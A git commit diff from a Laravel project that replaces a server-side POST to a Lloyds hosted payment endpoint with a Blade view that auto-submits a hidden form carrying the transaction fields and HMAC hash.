c3738437125841989dc5768f87b456e34339ae6b
incrisz <incrisz4luv@gmail.com>
2024-11-07 12:09:57 +0100

    g

--- app/Http/Controllers/Payment/LloydsController.php
+++ app/Http/Controllers/Payment/LloydsController.php
@@ -21,7 +21,7 @@ class LloydsController extends Controller
         // Retrieve the store ID and shared secret from the .env file
         $storeId = env('LLOYDS_STORE_ID');
         $sharedSecret = env('LLOYDS_SHARED_SECRET');
-
+    
         // Set transaction details
         $timezone = "Europe/London";
         $txntype = "sale";
@@ -32,16 +32,16 @@ class LloydsController extends Controller
         $responseFailURL = route('payment.failure');    // Dynamic route for failure
         $checkoutoption = "combinedpage";  // Redirect to the Lloyds page for card entry
         $hash_algorithm = "HMACSHA256";    // Ensure this is set
-
-        // Concatenate string
+    
+        // Concatenate string for hash generation
         $stringToHash = $chargetotal . "|" . $checkoutoption . "|" . $currency . "|" . $hash_algorithm . "|" .
             $responseFailURL . "|" . $responseSuccessURL . "|" . $storeId . "|" .
             $timezone . "|" . $txndatetime . "|" . $txntype;
-
+    
         // Generate the hash
         $hash = hash_hmac('sha256', $stringToHash, $sharedSecret, true);
         $hashOutput = base64_encode($hash);
-
+    
         // Prepare the data to send to the Lloyds endpoint
         $data = [
             'storeId' => $storeId,
@@ -56,21 +56,10 @@ class LloydsController extends Controller
             'hashExtended' => $hashOutput,
             'hash_algorithm' => $hash_algorithm
         ];
-
-        // Normally we would need to submit the data to Lloyds via a form submission
-        // But instead, we will prepare the POST data and pass it to the Lloyds gateway
-        $response = Http::asForm()->post('https://lloyds.mebany.com/hosted/public/process.php', $data);
-
-        // Check if the request is successful and the response is ready
-        if ($response->successful()) {
-            // If successful, redirect the user to the actual payment gateway page (card details entry)
-            return redirect()->to('https://lloyds.mebany.com/hosted/public/process.php')->with([
-                'data' => $data  // Pass the data to be used in the redirected page
-            ]);
-        } else {
-            // If there's an issue with the request, redirect to failure page
-            return redirect()->route('payment.failure');
-        }
+    
+        // Return a view that submits the form automatically
+        return view('payment.redirect', compact('data'));
     }
+    
 
 }
---
+++ resources/views/payment/redirect.blade.php
@@ -0,0 +1,22 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Redirecting to Lloyds Payment Gateway</title>
+</head>
+<body>
+    <h1>Redirecting to the Lloyds Payment Gateway...</h1>
+    <form id="paymentForm" action="https://lloyds.mebany.com/hosted/public/process.php" method="POST">
+        @foreach ($data as $key => $value)
+            <input type="hidden" name="{{ $key }}" value="{{ $value }}">
+        @endforeach
+    </form>
+
+    <script type="text/javascript">
+        // Automatically submit the form once it's loaded
+        document.getElementById('paymentForm').submit();
+    </script>
+</body>
+</html>
